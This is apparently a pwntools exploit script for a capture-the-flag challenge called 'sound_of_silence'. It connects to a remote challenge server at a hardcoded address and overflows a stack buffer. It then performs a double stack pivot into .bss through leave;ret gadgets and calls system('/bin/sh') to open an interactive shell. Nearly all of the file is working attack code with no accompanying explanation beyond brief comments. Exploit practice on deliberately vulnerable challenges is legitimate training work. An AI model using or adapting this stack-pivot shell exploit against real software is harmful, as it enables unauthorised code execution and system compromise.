#!/usr/bin/env python3

from pwn import *

# use "-l 500" with splitmind
context.terminal = ["tmux", "splitw", "-h", "-l 500"]

exe = ELF("pwn_sound_of_silence/challenge/sound_of_silence_patched")
libc = ELF("pwn_sound_of_silence/challenge/glibc/libc.so.6")
ld = ELF("pwn_sound_of_silence/challenge/glibc/ld-linux-x86-64.so.2")
context.binary = exe

host = "83.136.252.214"
port = 56736

# host = "localhost"
# port = 1337

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

# functions

# --- end functions ---

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set follow-fork-mode parent
start
bp main+0
c
'''.format(**locals())

io = start()

# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

ret = 0x401184
leave_ret = 0x401183 #: leave ; ret
padding_len = 0x20
middle_of_bss = 0x404800
main_skip_build_stack_frame = exe.sym['main'] + 12
mov_rdi_rax_call_system = exe.sym['main'] + 19


# stack pivot 1: rbp = middle_of_bss
payload = flat(
    'a'*padding_len,
    middle_of_bss,                  # rbp
    main_skip_build_stack_frame     # ret addr
)

sla(b">> ", payload)

# double stack pivot
# stack pivot 2 (function leave_ret):   rbp = middle_of_bss + 0x500
# stack pivot 3 (ret2leaveret):         rsp = rbp = middle_of_bss + 0x500  
cmd = b"/bin/sh\x00".ljust(padding_len, b'a')
payload = flat(
    cmd,
    middle_of_bss + 0x500,      # rbp
    leave_ret,                  # ret addr
    b"a"*(0xf8+0x400),          # padding to after stack pivot 3 return address
    mov_rdi_rax_call_system
)

sla(b">> ", payload)

io.interactive()

